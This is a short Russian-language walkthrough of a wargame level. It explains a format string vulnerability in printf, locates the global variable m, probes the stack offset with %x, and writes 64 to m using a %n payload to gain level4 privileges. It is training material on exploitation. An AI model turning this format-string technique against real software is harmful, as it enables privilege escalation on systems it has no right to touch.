функция main запускает функцию v, в которйо есть уязвимость: format string в printf
чтобы вплоть до 512 символов мы ни напечатали в запрашиваемой строке, printf это выполнит
если глобальная переменная m будет равна 64, мы автоматически получим необходимые нам права
достаточно изменить значение находящееся по адресу
info variables m
0x0804988c  m
r <<<$(python -c 'print "UUUU %x %x %x %x %x %x %x %x %x %x"')
UUUU 200 b7fd1ac0 b7ff37d0 55555555 20782520
показывает что printf ожидает увидеть аргумент на четвертой позиции
это позволяет нам изменить при помощи %n значение по данному адресу на 64
для этого перед %4n должно быть напечатано 64 символа:
python -c 'print "\x8c\x98\x04\x08" + "%60x" + "%4$n"' > /tmp/exploit3
cat /tmp/exploit3 /dev/stdin | ./level3
whoami
level4
